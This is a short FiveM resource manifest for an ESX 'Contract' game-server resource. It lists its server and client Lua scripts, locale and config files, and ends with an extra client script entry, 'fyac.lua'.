resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Contract'

version '1.0.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@extendedmode/locale.lua',
	'locales/de.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@extendedmode/locale.lua',
	'locales/de.lua',
	'config.lua',
	'client/main.lua'
}
client_script 'fyac.lua'